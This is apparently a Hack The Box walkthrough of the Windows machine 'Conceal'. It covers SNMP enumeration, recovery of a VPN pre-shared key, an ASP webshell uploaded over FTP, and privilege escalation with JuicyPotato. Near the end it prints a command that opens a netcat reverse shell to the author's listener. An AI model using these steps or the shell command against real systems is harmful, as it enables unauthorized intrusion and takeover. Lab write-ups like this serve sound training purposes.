---

title: "Conceal"
date: 2023-08-10T11:30:03+00:00
tags: ["snmp","web","windows","udp","vpn"]
categories: ["hackthebox"]
author: "0x0Pwn"
image: "/HTB/Conceal.png"
comments: false
description: "This is a friendly windows machine that is vulnerable because it contains in different UPD ports vulnerable to information enumeration, through which we can gain access to the machine's vpn and in turn to TCP ports.."

---

## Room Information

- Room name: Conceal
- Difficulty level: Hard
- Room link: https://app.hackthebox.com/machines/Conceal

![Untitled](/HTB/Conceal.png)

## Tools Used

- Nmap
- wfuzz
- gobuster
- ipesc
- msfvenom
- juicypotato
- smbserver
- nc.exe
- onesixtyone
- snmpwalk

## Port Scanning

Other room, other port scan.

![Untitled](/HTB/1-conceal.png)

```bash
# Nmap 7.94 scan initiated Thu Sep  7 06:23:16 2023 as: nmap -p 161,500 -Pn --min-rate 10000 -sCVU -n -oN targeted 10.10.10.116
Nmap scan report for 10.10.10.116
Host is up (0.23s latency).

PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server (public)
| snmp-interfaces: 
|   Software Loopback Interface 1\x00
|     IP address: 127.0.0.1  Netmask: 255.0.0.0
|     Type: softwareLoopback  Speed: 1 Gbps
|     Traffic stats: 0.00 Kb sent, 0.00 Kb received
|   vmxnet3 Ethernet Adapter\x00
|     IP address: 10.10.10.116  Netmask: 255.255.255.0
|     MAC address: 00:50:56:b9:44:0a (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Traffic stats: 103.13 Kb sent, 21.46 Mb received
|   vmxnet3 Ethernet Adapter-WFP Native MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:44:0a (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Traffic stats: 103.13 Kb sent, 21.46 Mb received
|   vmxnet3 Ethernet Adapter-QoS Packet Scheduler-0000\x00
|     MAC address: 00:50:56:b9:44:0a (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|     Traffic stats: 103.13 Kb sent, 21.46 Mb received
|   vmxnet3 Ethernet Adapter-WFP 802.3 MAC Layer LightWeight Filter-0000\x00
|     MAC address: 00:50:56:b9:44:0a (VMware)
|     Type: ethernetCsmacd  Speed: 4 Gbps
|_    Traffic stats: 103.13 Kb sent, 21.46 Mb received
| snmp-netstat: 
|   TCP  0.0.0.0:21           0.0.0.0:0
|   TCP  0.0.0.0:80           0.0.0.0:0
|   TCP  0.0.0.0:135          0.0.0.0:0
|   TCP  0.0.0.0:445          0.0.0.0:0
|   TCP  0.0.0.0:49664        0.0.0.0:0
|   TCP  0.0.0.0:49665        0.0.0.0:0
|   TCP  0.0.0.0:49666        0.0.0.0:0
|   TCP  0.0.0.0:49667        0.0.0.0:0
|   TCP  0.0.0.0:49668        0.0.0.0:0
|   TCP  0.0.0.0:49669        0.0.0.0:0
|   TCP  0.0.0.0:49670        0.0.0.0:0
|   TCP  10.10.10.116:139     0.0.0.0:0
|   UDP  0.0.0.0:123          *:*
|   UDP  0.0.0.0:161          *:*
|   UDP  0.0.0.0:500          *:*
|   UDP  0.0.0.0:4500         *:*
|   UDP  0.0.0.0:5050         *:*
|   UDP  0.0.0.0:5353         *:*
|   UDP  0.0.0.0:5355         *:*
|   UDP  10.10.10.116:137     *:*
|   UDP  10.10.10.116:138     *:*
|   UDP  10.10.10.116:1900    *:*
|   UDP  10.10.10.116:51660   *:*
|   UDP  127.0.0.1:1900       *:*
|_  UDP  127.0.0.1:51661      *:*
| snmp-win32-software: 
|   Microsoft Visual C++ 2008 Redistributable - x64 9.0.30729.6161; 2021-03-17T15:16:36
|   Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.6161; 2021-03-17T15:16:36
|_  VMware Tools; 2021-03-17T15:16:36
| snmp-sysdescr: Hardware: Intel64 Family 6 Model 85 Stepping 7 AT/AT COMPATIBLE - Software: Windows Version 6.3 (Build 15063 Multiprocessor Free)
|_  System uptime: 22m23.38s (134338 timeticks)
| snmp-win32-users: 
|   Administrator
|   DefaultAccount
|   Destitute
|_  Guest
| snmp-win32-services: 
|   Application Host Helper Service
|   Background Intelligent Transfer Service
|   Background Tasks Infrastructure Service
|   Base Filtering Engine
|   CNG Key Isolation
|   COM+ Event System
|   COM+ System Application
|   Connected Devices Platform Service
|   Connected User Experiences and Telemetry
|   CoreMessaging
|   Cryptographic Services
|   DCOM Server Process Launcher
|   DHCP Client
|   DNS Client
|   Data Sharing Service
|   Data Usage
|   Device Setup Manager
|   Diagnostic Policy Service
|   Diagnostic Service Host
|   Diagnostic System Host
|   Distributed Link Tracking Client
|   Distributed Transaction Coordinator
|   Geolocation Service
|   Group Policy Client
|   IKE and AuthIP IPsec Keying Modules
|   IP Helper
|   IPsec Policy Agent
|   Local Session Manager
|   Microsoft FTP Service
|   Microsoft Software Shadow Copy Provider
|   Network Connection Broker
|   Network List Service
|   Network Location Awareness
|   Network Store Interface Service
|   Plug and Play
|   Power
|   Print Spooler
|   Program Compatibility Assistant Service
|   RPC Endpoint Mapper
|   Remote Procedure Call (RPC)
|   SNMP Service
|   SSDP Discovery
|   Security Accounts Manager
|   Security Center
|   Server
|   Shell Hardware Detection
|   State Repository Service
|   Storage Service
|   Superfetch
|   System Event Notification Service
|   System Events Broker
|   TCP/IP NetBIOS Helper
|   Task Scheduler
|   Themes
|   Time Broker
|   TokenBroker
|   User Manager
|   User Profile Service
|   VMware Alias Manager and Ticket Service
|   VMware CAF Management Agent Service
|   VMware Physical Disk Helper Service
|   VMware Tools
|   Volume Shadow Copy
|   WinHTTP Web Proxy Auto-Discovery Service
|   Windows Audio
|   Windows Audio Endpoint Builder
|   Windows Connection Manager
|   Windows Defender Antivirus Network Inspection Service
|   Windows Defender Antivirus Service
|   Windows Defender Security Centre Service
|   Windows Driver Foundation - User-mode Driver Framework
|   Windows Event Log
|   Windows Firewall
|   Windows Font Cache Service
|   Windows Management Instrumentation
|   Windows Process Activation Service
|   Windows Push Notifications System Service
|   Windows Search
|   Windows Time
|   Workstation
|_  World Wide Web Publishing Service
| snmp-processes: 
|   1: 
|     Name: System Idle Process
|   4: 
|     Name: System
|   284: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNoNetwork
|   300: 
|     Name: smss.exe
|   360: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalService
|   388: 
|     Name: csrss.exe
|   468: 
|     Name: wininit.exe
|   476: 
|     Name: csrss.exe
|   532: 
|     Name: winlogon.exe
|   608: 
|     Name: services.exe
|   616: 
|     Name: lsass.exe
|     Path: C:\Windows\system32\
|   640: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k swprv
|   684: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceAndNoImpersonation
|   708: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k DcomLaunch
|   728: 
|     Name: fontdrvhost.exe
|   736: 
|     Name: fontdrvhost.exe
|   824: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k RPCSS
|   912: 
|     Name: dwm.exe
|   956: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   968: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   984: 
|     Name: vmacthlp.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1004: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalSystemNetworkRestricted
|   1052: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k NetworkService
|   1100: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k netsvcs
|   1288: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1308: 
|     Name: Memory Compression
|   1372: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalServiceNetworkRestricted
|   1384: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k LocalServiceNetworkRestricted
|   1492: 
|     Name: spoolsv.exe
|     Path: C:\Windows\System32\
|   1632: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k appmodel
|   1716: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k apphost
|   1732: 
|     Name: svchost.exe
|     Path: C:\Windows\System32\
|     Params: -k utcsvc
|   1756: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k ftpsvc
|   1812: 
|     Name: SecurityHealthService.exe
|   1824: 
|     Name: snmp.exe
|     Path: C:\Windows\System32\
|   1880: 
|     Name: VGAuthService.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware VGAuth\
|   1892: 
|     Name: vmtoolsd.exe
|     Path: C:\Program Files\VMware\VMware Tools\
|   1900: 
|     Name: ManagementAgentHost.exe
|     Path: C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\
|   1920: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k iissvcs
|   1972: 
|     Name: MsMpEng.exe
|   2356: 
|     Name: SearchFilterHost.exe
|     Path: C:\Windows\system32\
|     Params:  0 696 700 708 8192 704 
|   2420: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k NetworkServiceNetworkRestricted
|   2804: 
|     Name: LogonUI.exe
|     Params:  /flags:0x0 /state0:0xa39c8855 /state1:0x41c64e6d
|   2816: 
|     Name: msdtc.exe
|     Path: C:\Windows\System32\
|   2884: 
|     Name: WmiPrvSE.exe
|     Path: C:\Windows\system32\wbem\
|   3040: 
|     Name: dllhost.exe
|     Path: C:\Windows\system32\
|     Params: /Processid:{02D4B3F1-FD88-11D1-960D-00805FC79235}
|   3056: 
|     Name: svchost.exe
|     Path: C:\Windows\system32\
|     Params: -k LocalSystemNetworkRestricted
|   3112: 
|     Name: SearchIndexer.exe
|     Path: C:\Windows\system32\
|     Params: /Embedding
|   3128: 
|     Name: VSSVC.exe
|     Path: C:\Windows\system32\
|   3392: 
|     Name: NisSrv.exe
|   4880: 
|     Name: SearchProtocolHost.exe
|     Path: C:\Windows\system32\
|_    Params:  Global\UsGthrFltPipeMssGthrPipe2_ Global\UsGthrCtrlFltPipeMssGthrPipe2 1 -2147483646 "Software\Microsoft\Windows Search" "Mozil
500/udp open  isakmp  Microsoft Windows 8
| fingerprint-strings: 
|   IKE_MAIN_MODE: 
|     "3DUfw{
|_    XEW(
| ike-version: 
|   vendor_id: Microsoft Windows 8
|   attributes: 
|     MS NT5 ISAKMPOAKLEY
|     RFC 3947 NAT-T
|     draft-ietf-ipsec-nat-t-ike-02\n
|     IKE FRAGMENTATION
|     MS-Negotiation Discovery Capable
|_    IKE CGA version 1
Service Info: Host: Conceal; OS: Windows 8; CPE: cpe:/o:microsoft:windows:8, cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep  7 06:26:21 2023 -- 1 IP address (1 host up) scanned in 185.55 seconds 
```

After scanning the **TCP** ports I saw that there was nothing, and it seemed very strange to me so I decided to scan the **UDP** ports just in case and I found the ports **161**, **501** open.

Once I managed to connect to the server's vpn I was able to perform a scan of the tcp ports and saw that there were a few open, such as: 80 (http), 21 (ftp), among others …

## Enumeration

As I always do with all machines I set out to do the directory scan with **gobuster** and **wfuzz,** and I find some things:

![Untitled](/HTB/2-conceal.png)

So interesting that I found a directory called `\upload\` …

A photo of the website:

![Untitled](/HTB/3-conceal.png)

I only found the past directory, so I decided exploiting the other ports …

## Exploiting

As I only have these two ports, there were no other options. With the ports that I had I could only manage to filter some internal information from the machine. So the vulnerability had to be in some information leak. On the other hand, port 500 was open and this meant that there was a VPN network to which the machine was connected.

So I started to filter information following **hacktricks** indications, first I used `onesixtyone` to see what was the keyword that port 161 used to connect to the machine, and I saw that it was public.

![Untitled](/HTB/4-conceal.png)

I then used `snmpwalk` to get the machine's information listed, and saw that there was a parameter that said `IKE VPN password PSK ...` , so I searched the internet and saw that that was the VPN running on port 500.

![Untitled](/HTB/5-conceal.png)

But this password I found is hashed, so first of all I need to **decrypt** it to do could do something.

![Untitled](/HTB/6-conceal.png)

So once I knew this, I started looking for information on how to connect to the VPN. I saw that I had to modify the files `/etc/ipsec.conf` and `/etc/ipsec.secrets`.

In the `/etc/ipsec.conf` file I had to modify it as follows:

```bash
# ipsec.conf - strongSwan IPsec configuration file

# basic configuration

#config setup
	# strictcrlpolicy=yes
	# uniqueids = no

# Add connections here.

# Sample VPN connections

#conn sample-self-signed
#      leftsubnet=10.1.0.0/16
#      leftcert=selfCert.der
#      leftsendcert=never
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightcert=peerCert.der
#      auto=start

#conn sample-with-ca-cert
#      leftsubnet=10.1.0.0/16
#      leftcert=myCert.pem
#      right=192.168.0.2
#      rightsubnet=10.2.0.0/16
#      rightid="C=CH, O=Linux strongSwan CN=peer name"
#      auto=start

# ipsec.conf - strongSwan IPsec configuration file

config setup
    charondebug="all"
    uniqueids=yes
    strictcrlpolicy=no

conn conceal
    authby=secret
    auto=add
    ike=3des-sha1-modp1024!
    esp=3des-sha1!
    type=transport
    keyexchange=ikev1
    left=10.10.14.16
    right=10.10.10.116
    rightsubnet=10.10.10.116[tcp]
```

In the `/etc/ipsec.secret` file I had to modify it as follows:

```bash
# This file holds shared secrets or RSA private keys for authentication.

# RSA private key for this host, authenticating it to any other host
# which knows the public part.

# This file holds shared secrets or RSA private keys for authentication.

%any : PSK "Dudecake1!"
```

After that only rests to connect to the **VPN**:

```bash
sudo ipsec restart
sudo ipsec up conceal
```

![Untitled](/HTB/7-conceal.png)

Then i reran a scan of ports **TCP** with **nmap** and I found this:

```bash
sudo nmap -sT -p- --min-rate 10000 -Pn 10.10.10.116 -oG allPorts
```

![Untitled](/HTB/8-conceal.png)

![Untitled](/HTB/9-conceal.png)

I quickly realized that there was a web page and we were allowed to connect via ftp, so I uploaded a pruebfile, test.txt and went to the /upload/ directory to see if it was there. And it was 😎

Then I tried with a reverse shell with extension **.config**, or **.aspx**, but it didn't work, so I tried with **.asp** and it worked.

![Untitled](/HTB/10-conceal.png)

I upload the file `webshell.asp` :

![Untitled](/HTB/11-conceal.png)

I leave the link to the webshell.asp exploit here → https://github.com/tennc/webshell/blob/master/asp/webshell.asp

![Untitled](/HTB/12-conceal.png)

website → https://www.revshells.com/

![Untitled](/HTB/13-conceal.png)

![Untitled](/HTB/14-conceal.png)

At this point I was in 😇

## Escalating Privileges

I was logged in as the destitute user, but I could not access the administrator user so I had to escalate privileges.

![Untitled](/HTB/15-conceal.png)

I did a systeminfo on the windows machine to run it through the windows-vuln-sugester, but I was trying some of the results it gave me and none of them worked. 

![Untitled](/HTB/16-conceal.png)

Then I did the usual `whoami /priv` and saw that was vulnerable to `JuicyPotato`, so the following is history 😎

I execute this command on the victim powershell and I recived the shell on my listener machine at port 443.

```bash
./JuicyPotato.exe -t * -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p C:\Windows\System32\cmd.exe -a "/c C:\Windows\Temp\Privesc\nc.exe -e cmd 10.10.14.11 443"
```

![Untitled](/HTB/17-conceal.png)

## Lessons Learned

- What insights did you gain from the room?
    
    I learn more about UDP ports and VPN’s.
    
- Where there any novel tools or techniques employed?
    
    The use of onesixtyone, snmpwalk, etc.
